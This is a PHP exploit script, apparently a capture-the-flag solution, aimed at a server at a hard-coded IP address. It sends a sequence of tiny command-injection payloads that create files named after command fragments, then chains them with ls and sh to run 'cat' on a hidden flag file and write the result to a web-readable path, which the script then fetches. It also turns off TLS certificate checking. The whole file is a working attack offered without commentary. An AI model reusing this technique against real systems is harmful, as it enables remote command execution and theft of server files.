<?php
function curl($url='', $var='') {
    global $config;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
    if($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);

    }
    if (isset($config['cookie_file'])) {
        if (file_exists($config['cookie_file'])) {
            curl_setopt($curl, CURLOPT_COOKIEFILE,$config['cookie_file']);
            curl_setopt($curl, CURLOPT_COOKIEJAR,$config['cookie_file']);

        }
    }
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
$url = 'http://128.199.92.132/jjj/';
$ip  = md5("36.82.98.123");
$flag = $url.$ip.'/gw';
curl($url. '?reset=1');
echo dirname($url) . "/" .$ip . PHP_EOL;

// a b c d e f g h i j k l m n o p q r s t u v w x y z
$payload = [
    // '>cat\ \\',
    // '>flagabcdefgh\ >g\\',
    // '\ >\>g',
    // 'ls>>_',

    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-atr\ \\', 
    '>\>ga', 
    'ls>>_', 

    #Generate cat flag
    '>cat\ \\', //  htfl agsan dbox zaz sdmno
    '>.htfl\\', 
    '>agsan\\', 
    '>dbox\\', 
    '>zaz\\', 
    '>sdmn\\', 
    '>o\>gw', 

    // # exec
    'sh ./_',
    'sh ./ga'
]; 

foreach ($payload as $key => $value) {
    curl($url, 'a'.$value);
    sleep(2);
    echo $value . "\r\n";
}
echo curl($flag);
